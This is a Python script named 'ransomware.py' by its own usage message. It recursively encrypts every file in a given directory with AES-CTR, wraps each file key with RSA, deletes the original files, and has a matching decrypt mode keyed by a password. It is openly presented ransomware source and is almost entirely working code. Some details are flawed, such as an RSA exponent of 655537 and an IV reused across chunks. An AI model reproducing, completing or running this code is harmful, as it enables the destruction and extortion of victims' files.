import time
import datetime
import os
import sys
import base64
from os import listdir
from os.path import isfile, join
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# serialize key as PEM format from object
def serializeKey(key):
	return key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo)

# load key object from given key in PEM format
def undoSerializeKey(key):
	return serialization.load_pem_public_key(key,backend=default_backend())

# store a key in PEM format on a file on disk
# a password is required to store private key   
def storeKeyPEM(key,password,path=""):
	if(not password):
		print("Error: Password is required to store private key")
		return -1
	fname = 'private.pem'
	pem = key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8,encryption_algorithm=serialization.BestAvailableEncryption(password))
	try:
		with open(path+"/"+fname,"w") as file:
			file.write(pem.decode())
	except Exception as exc:
		print(exc)
		print("Error occurred while writing key on file")
		return -1

	return 1

# load a private key from file
def loadKeyPEM(password=None,path=""):
    if(not password):
        print("Error: Password is required to store private key")
        return -1
    fname = 'private.pem'
    try:
        with open(path+"/"+fname, "rb") as key_file:
            key = serialization.load_pem_private_key(key_file.read(),password=password,backend=default_backend())
        key_file.close()        
    except Exception as exc:
        print(exc)
        return -1

    return key

# generate a new key pair value of assymetric keys (private,public)
# public key is serialized
def newRSAKeyPair():
	priv_key = rsa.generate_private_key(public_exponent=655537,key_size=2048,backend=default_backend())
	pub_key = priv_key.public_key()
	pub_key = pub_key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo)
	return (priv_key,pub_key)

# generate digest of data input using SHA256
def digestSHA256(data):
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(data)
    hash =  digest.finalize()
    return hash

# encrypt value using RSA algorithm
def encryptRSA(pub_key, value):
	ciphertext = pub_key.encrypt(value,padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()),algorithm=hashes.SHA1(),label=None))
	return base64.b64encode(ciphertext)

# decrypt ciphertext using RSA algorithm 
def decryptRSA(priv_key,ciphertext):
	value = priv_key.decrypt(base64.b64decode(ciphertext),padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(),label=None))
	return value

# AES encryption of data with key "key" and cipher mode CTR
def encryptAES(data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv), default_backend())
    encryptor = cipher.encryptor()
    encData = encryptor.update(data) + encryptor.finalize()
    return encData

# AES decryption of ciphertext with key "key", initialization vector "iv" and cipher mode CTR
def decryptAES(ciphertext, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv), default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

def encryptFile(dir, f, pub_key):

	chunksize = 64 * 1024
	outFile = os.path.join(dir, "(encrypted)"+os.path.basename(f))
	filesize = str(os.path.getsize(os.path.join(dir,f))).zfill(16)

	key = os.urandom(32)

	print(len(key))

	iv = os.urandom(16)

	cipher_key = encryptRSA(undoSerializeKey(pub_key), key)

	print(len(cipher_key))

	try:
		with open(os.path.join(dir,f), "rb") as infile:
			with open(outFile, "wb") as outfile:
				outfile.write(filesize.encode())
				outfile.write(cipher_key)
				outfile.write(iv)
				while True:
					chunk = infile.read(chunksize)
					if len(chunk) == 0:
						break		
					elif len(chunk) % 16 !=0:
						chunk += ' '.encode() *  (16 - (len(chunk) % 16))

					outfile.write(encryptAES(chunk, key, iv))
		os.remove(os.path.join(dir,f))
	except Exception:
		print(Exception)
		return False

	del key
	del iv
	del cipher_key

	return True

def decryptFile(dir, f, priv_key):

	outFile = os.path.join(dir, os.path.basename(f[11:]))
	chunksize = 64 * 1024

	try:
		with open(os.path.join(dir,f), "rb") as infile:

			filesize = infile.read(16)
			sim_key =  decryptRSA(priv_key,infile.read(344))
			iv = infile.read(16)
			
			with open(outFile, "wb") as outfile:
				while True:
					chunk = infile.read(chunksize)
					if len(chunk) == 0:
						break

					outfile.write(decryptAES(chunk, sim_key, iv))

				outfile.truncate(int(filesize))
		os.remove(os.path.join(dir,f))
	except Exception:
		return False

	return True

def decryptDirectoryTree(dir, priv_key):
	total_files = 0
	decrypted_files = 0
	for root, dirs, files in os.walk(dir):

		level = root.replace(dir, '').count(os.sep)
		indent = ' ' * 4 * (level)
		print('{}{}/'.format(indent, os.path.basename(root)))
		subindent = ' ' * 4 * (level + 1)

		for f in files:
			print('{}{}'.format(subindent, f))

			if(f.startswith("(encrypted)")):			
				if(decryptFile(root, f, priv_key)):
					print("File <{}> : decryption successful".format(f))
					decrypted_files+=1
				else:
					print("File <{}> : decryption failed".format(f))
			total_files+=1

	return total_files, decrypted_files;


def encryptDirectoryTree(dir, pub_key):
	total_files = 0
	encrypted_files = 0
	for root, dirs, files in os.walk(dir):

		level = root.replace(dir, '').count(os.sep)
		indent = ' ' * 4 * (level)
		print('{}{}/'.format(indent, os.path.basename(root)))
		subindent = ' ' * 4 * (level + 1)

		for f in files:
			print('{}{}'.format(subindent, f))

			if(f.startswith("(encrypted)")):
				total_files+=1
				continue
			
			if(encryptFile(root, f, pub_key)):
				print("File <{}> : encryption successful".format(f))
				encrypted_files+=1
			else:
				print("File <{}> : encryption failed".format(f))
			total_files+=1

	return total_files, encrypted_files;

start_time = time.time()

if __name__ == "__main__":
	if(len(sys.argv)!=4):
		print("Usage: ransomware.py <dir> <e|d> <password>")
		sys.exit(1)

	print("> Ransomware encryptor starting...")

	password = digestSHA256((sys.argv[3]).encode()) # password digest

	# key pair generation
	# public key will be used to cipher each unique simmetric key 
	# used to encrypt each file
	priv_key, pub_key = newRSAKeyPair();

	if(sys.argv[2] == 'e'):
		storeKeyPEM(priv_key, password, path=os.getcwd()) # store private key in cwd
		cnt_files = encryptDirectoryTree(sys.argv[1],pub_key)
		print("Encrypted {} file(s) [{}\{}] in directory {}".format(cnt_files[1],cnt_files[1],cnt_files[0],sys.argv[1]))
	elif(sys.argv[2] == 'd'):
		p_key = loadKeyPEM(password, path=os.getcwd())
		cnt_files = decryptDirectoryTree(sys.argv[1],p_key)
		print("Decrypted {} file(s) [{}\{}] in directory {}".format(cnt_files[1],cnt_files[1],cnt_files[0],sys.argv[1]))
	else:
		print("Usage: ransomware.py <dir> <e|d> <password>")
		sys.exit(1)

	print("Total time of execution : {} ".format(datetime.timedelta(seconds=time.time()-start_time)))
